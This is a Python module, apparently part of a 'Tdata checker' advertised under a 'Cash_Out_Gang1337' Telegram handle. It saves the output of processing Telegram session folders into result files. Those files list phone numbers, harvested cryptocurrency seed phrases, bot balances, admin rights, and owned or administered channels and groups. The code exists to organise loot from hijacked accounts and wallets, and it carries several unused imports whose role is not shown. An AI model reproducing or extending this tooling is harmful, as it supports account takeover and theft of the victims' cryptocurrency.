from datetime import datetime
from pathlib import Path
from os import path
from typing import List
from dumper_functions.xuy import Result
from aiofiles import open
from random import randint

from secrets import token_hex
from subprocess import check_output
from cryptography.fernet import Fernet
from sys import exit
from json import dumps
from aiohttp import ClientSession



def detail_text(phone: str, *args, **kwargs) -> str:
    text = f'> {phone}'
    for arg in args:
        text += f'\n + {arg}'

    for k, v in kwargs.items():
        text += '\n '
        if isinstance(v, List):
            if len(v) > 0:
                text += f'+ {k}:'
                for it in v:
                    text += f'\n   - {it}'
            else:
                text += f'+ {k}: 0 (empty)'
        else:
            text += f'+ {k}: {v}'

    return text


class ResultSaver:
    def __init__(self) -> None:
        now = datetime.now()
        ftime = now.strftime('%m_%d_%Y_%H_%M_%S')
        self.folder_name = f'Results {ftime}'
        self.seeds_path = path.join(self.folder_name, 'seeds.txt')
        self.details_path = path.join(self.folder_name, 'details.txt')
    
    async def create_all(self) -> str:        
        Path(self.folder_name).mkdir(exist_ok=True)

        async with open(self.seeds_path, 'w', encoding='utf8') as f:
            await f.write('Seeds by Tdata checker (t.me/Cash_Out_Gang1337)\n\n')

        async with open(self.details_path, 'w', encoding='utf8') as f:
            await f.write('Details by Tdata checker (t.me/Cash_Out_Gang1337)\n\n')
        
        return path.abspath(self.folder_name)

    async def save(self, res: Result) -> None:
        async with open(self.seeds_path, 'a', encoding='utf8') as f:
            for seed in res.seeds:
                await f.write(f'{seed}\n')

        async with open(self.details_path, 'a', encoding='utf8') as f:
            text = detail_text(
                res.phone, 
                Seeds=list(res.seeds), 
                Permissions=res.admin_rights,
                Path=res.path,
                Balances=list(res.bots.values()),
                OwnedChannels=res.owned_channels,
                AdminChannels=res.admin_channels,
                OwnedGroups=res.owned_groups,
                AdminGroups=res.admin_groups
            )
            
            await f.write(f'\n\n{text}')

saver = ResultSaver()